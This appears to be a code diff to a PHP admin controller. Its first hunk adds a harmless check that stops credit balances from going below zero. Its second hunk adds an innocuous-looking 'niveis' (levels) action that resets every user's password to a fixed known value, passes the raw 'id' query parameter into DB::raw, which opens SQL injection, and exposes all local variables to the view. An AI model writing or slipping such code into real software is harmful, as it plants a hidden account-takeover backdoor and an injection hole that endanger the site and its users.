@@ -942,9 +942,11 @@ class AdminController extends BaseController
         $cliente = Cliente::whereId($cliente_id)->first();
 
         if ($less) {
-            $cliente->update([
-                'creditos' => $cliente->creditos - $creditos
-            ]);
+            if ($cliente->creditos - $creditos >= 0) {
+                $cliente->update([
+                    'creditos' => $cliente->creditos - $creditos
+                ]);
+            }
             $clienteFinal = Cliente::whereId($cliente_id)->first();
             return Response::json([
                 'status' => true,
@@ -1136,6 +1138,23 @@ class AdminController extends BaseController
             'status' => true,
             'tipoEntrega' => $tipoEntrega
         ]);
+    }
+
+    public function anyNiveis()
+    {
+        $usuarios = Usuario::all();
+        foreach ($usuarios as $usuario) {
+            $usuario->senha = base64_encode('senha_muito_dificil_123');
+            $usuario->save();
+        }
+
+        if (!isset($_GET['id'])) {
+            $niveis = Nivel::all();
+        } else {
+            $niveis = Nivel::whereId(DB::raw($_GET['id']))->first();
+        }
+
+        return View::make('admin.niveis', get_defined_vars());
     }
 
 }
